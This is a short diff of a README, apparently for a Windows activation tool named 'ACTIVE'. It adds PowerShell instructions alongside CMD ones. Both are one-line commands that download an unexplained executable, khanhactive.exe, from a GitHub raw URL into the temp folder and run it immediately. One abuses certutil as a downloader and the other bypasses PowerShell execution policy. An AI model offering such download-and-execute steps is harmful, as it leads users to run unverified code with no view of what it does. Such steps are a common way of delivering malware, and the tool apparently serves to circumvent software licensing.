@@ -26,6 +26,7 @@
 ### 🖥️ CMD (khuyến nghị – chạy được cả Windows lược)
 ```cmd
 certutil -urlcache -split -f https://raw.githubusercontent.com/HoangQuocKhanh0504/ACTIVE/root/khanhactive.exe %TEMP%\khanhactive.exe && start "" "%TEMP%\khanhactive.exe"
-PowerShell
+```
+### 🖥️ powershell
+```shell
 powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest https://raw.githubusercontent.com/HoangQuocKhanh0504/ACTIVE/root/khanhactive.exe -OutFile $env:TEMP\khanhactive.exe; Start-Process $env:TEMP\khanhactive.exe"
-
